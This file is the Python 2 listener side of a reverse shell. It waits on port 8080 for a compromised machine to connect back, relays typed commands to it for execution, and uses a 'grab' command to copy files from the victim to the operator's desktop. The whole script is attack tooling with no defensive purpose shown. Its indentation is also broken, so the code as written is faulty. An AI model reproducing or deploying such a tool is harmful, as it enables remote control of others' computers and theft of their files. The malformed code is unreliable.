import socket 
import os 
     
def transfer(conn,command,fname):
    
    conn.send(command)
    file_name = '/home/shiva/Desktop/' + str(fname)
    f = open(file_name,'wb')
    bits = conn.recv(1024)    
    while bits:  
        try:
            if 'Unable to find out the file' in bits:
                print '[-] Unable to find out the file'
                break
            if bits.endswith('DONE'):
                print '[+] Transfer completed '
                break
	        else:
                f.write(bits)
	            bits = conn.recv(1024)
    	    
    	    f.close()

	    except Exception as e:
		    print(e)    



def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("192.168.1.6", 8080))
    s.listen(1)
    print '[+] Listening for incoming TCP connection on port 8080'
    conn, addr = s.accept()
    print '[+] We got a connection from: ', addr



    while True:       
        command = raw_input("Shell> ")
        if 'terminate' in command:
            conn.send('terminate')
            conn.close() 
            break

        elif 'grab' in command:
            NULL,fname = command.split("*") 
            transfer(conn,command,fname)        
            
        else:
            conn.send(command) 
            print conn.recv(1024) 
        
def main ():
    connect()
try:
    main()
except KeyboardInterrupt:
    print "Goodbye"
    exit(0)    